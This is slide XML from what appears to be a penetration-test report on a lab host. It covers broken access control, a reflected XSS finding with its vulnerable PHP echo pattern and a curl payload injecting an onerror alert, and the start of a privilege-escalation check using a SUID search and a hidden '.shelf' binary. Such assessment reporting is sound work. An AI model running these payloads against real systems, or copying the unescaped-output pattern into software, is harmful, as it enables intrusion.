              <a:gd name="adj" fmla="val 8000"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="3584448"/>
            <a:ext cx="4983480" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>OBSERVED</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Text 17"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="3858768"/>
            <a:ext cx="4983480" cy="457200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="EF4444"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>HTTP 200 OK + full page content, no barrier at all</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="20" name="Shape 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4572000"/>
            <a:ext cx="11064240" cy="1417320"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5161"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="4709160"/>
            <a:ext cx="10515600" cy="256032"/>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KEY DEFINITIONS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Text 20"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="5029200"/>
            <a:ext cx="10515600" cy="822960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Authentication</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> — proving who you are (a login check).   </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Authorization</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> — controlling what you're allowed to do once identified.   </a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Broken Access Control</a:t>
            </a:r>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="125000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t> — the app never even checks authorization/authentication on this specific page before serving it.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16</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07 · APPLICATION VULNERABILITIES</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Reflected Cross-Site Scripting (XSS)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="5349240" cy="1097280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="5349240" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Vulnerable source pattern:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="1691640"/>
            <a:ext cx="4937760" cy="731520"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$status = $_GET['status'];</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>echo $status;</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2651760"/>
            <a:ext cx="5349240" cy="1078992"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5085"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2743200"/>
            <a:ext cx="5020056" cy="896112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ curl -iG --data-urlencode \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$   'status=&lt;img src=x onerror=alert(document.domain)&gt;' \</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$   http://192.168.76.157/.../contact.php</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4160520"/>
            <a:ext cx="5349240" cy="201168"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="38BDF8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>REFLECTED XSS, CONCEPTUALLY</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="4361688"/>
            <a:ext cx="5349240" cy="914400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F1F5F9"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>User-controlled input flows straight into the HTML response with no output encoding — the browser can't distinguish injected markup from the page's own content.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Shape 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6117336" y="1362456"/>
            <a:ext cx="5550408" cy="2715768"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2694"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="14" name="Image 0" descr="/home/claude/report_imgs/fig7_xss_reflected.jpg">    </p:cNvPr>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:srcRect l="0" r="0" t="0" b="0"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="1417320"/>
            <a:ext cx="5440680" cy="2606040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Text 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4096512"/>
            <a:ext cx="5440680" cy="274320"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr" indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1000" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="94A3B8"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>Figure 6 — payload reflected unescaped in the HTTP response</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6172200" y="4480560"/>
            <a:ext cx="5440680" cy="1371600"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5333"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="141B2E"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="4590288"/>
            <a:ext cx="4983480" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Arial" pitchFamily="34" charset="0"/>
                <a:ea typeface="Arial" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Arial" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ACCURACY MATTERS</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 15"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="4873752"/>
            <a:ext cx="4983480" cy="914400"/>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HTTP-level reflection was CONFIRMED — the payload comes back unescaped in the response. A browser-side alert() execution was NOT conclusively captured. We do not overclaim JavaScript execution beyond what the evidence shows.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17</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08 · PRIVILEGE ESCALATION ASSESSMENT</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Can We Become defender or root?</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="1417320"/>
            <a:ext cx="5349240" cy="493776"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 11111"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="1508760"/>
            <a:ext cx="5020056" cy="310896"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1300" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ find / -perm -4000 -type f 2&gt;/dev/null</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2103120"/>
            <a:ext cx="5349240" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 14545"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1B2436"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="777240" y="2103120"/>
            <a:ext cx="4937760" cy="502920"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="ctr"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1350" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="F97316"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>/home/defender/Downloads/.shelf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1350" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="548640" y="2788920"/>
            <a:ext cx="5349240" cy="786384"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 6977"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="060B14"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="2A3550"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="713232" y="2880360"/>
            <a:ext cx="5020056" cy="603504"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ ls -l /home/defender/Downloads/.shelf</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr indent="0" marL="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="5EEAD4"/>
                </a:solidFill>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>$ stat /home/defender/Downloads/.shelf</a:t>
